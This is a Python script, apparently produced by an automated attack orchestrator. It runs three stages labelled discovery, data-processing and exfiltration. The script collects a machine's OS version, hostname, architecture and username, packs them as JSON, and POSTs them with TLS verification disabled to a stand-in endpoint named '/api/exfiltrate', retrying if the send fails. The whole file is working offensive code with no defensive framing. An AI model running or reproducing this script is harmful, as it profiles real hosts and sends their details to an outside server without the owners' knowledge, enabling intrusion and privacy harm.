#!/usr/bin/env python3
import sys, json, time, platform, os, subprocess
import requests
from typing import Dict, Any

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Collect OS version
        os_version = platform.version()

        # Collect hostname
        hostname = platform.node()

        # Collect architecture
        architecture = platform.machine()

        # Collect current username
        username = os.getenv('USERNAME') or os.getenv('USER')
        if not username:
            try:
                import win32api
                username = win32api.GetUserName()
            except ImportError:
                username = None

        # Prepare result
        result = {
            'os_version': os_version,
            'hostname': hostname,
            'architecture': architecture,
            'username': username
        }

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Extract system information from input_data
        os_version = input_data.get('os_version', '')
        hostname = input_data.get('hostname', '')
        architecture = input_data.get('architecture', '')
        username = input_data.get('username', '')

        # Prepare the JSON payload
        system_info = {
            'os_version': os_version,
            'hostname': hostname,
            'architecture': architecture,
            'username': username
        }
        json_payload = json.dumps(system_info)

        # Prepare the result dictionary
        result = {
            'json_payload': json_payload
        }

        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    try:
        # Parse the JSON payload from the input data
        json_payload = json.loads(input_data.get('json_payload', '{}'))
        
        # Define the remote server URL
        url = "https://remote-server.example.com/api/exfiltrate"
        
        # Send the JSON payload to the remote server using HTTPS POST
        response = requests.post(url, json=json_payload, timeout=10, verify=False, headers={'Content-Type': 'application/json'})
        
        # Prepare the result based on the response
        result = {
            'success': response.status_code == 200,
            'status_code': response.status_code
        }
        
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except (requests.ConnectionError, requests.Timeout) as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
    except Exception as e:
        return {'success': False, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Collect System Information [discovery] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Collect System Information): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Collect System Information): FAILED — {err}')
            failed.append('T1')
            print('[!] abort_mission — stopping')
            return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
        return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    
    # ── T2: Prepare Data for Transmission [data-processing] ──
    try:
        r = task_T2(outputs.get('T1', {}))
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Prepare Data for Transmission): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Prepare Data for Transmission): FAILED — {err}')
            failed.append('T2')
            print('[!] abort_mission — stopping')
            return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
        return {'success': False, 'failed': failed, 'outputs': outputs, 'results': results}
    
    # ── T3: Transmit Data to Remote Server [exfiltration] ──
    try:
        r = task_T3(outputs.get('T2', {}))
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Transmit Data to Remote Server): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Transmit Data to Remote Server): FAILED — {err}')
            failed.append('T3')
            r2 = task_T3(outputs.get('T2', {}))
            if r2.get('success'):
                outputs['T3'] = r2.get('data', {})
                failed.remove('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))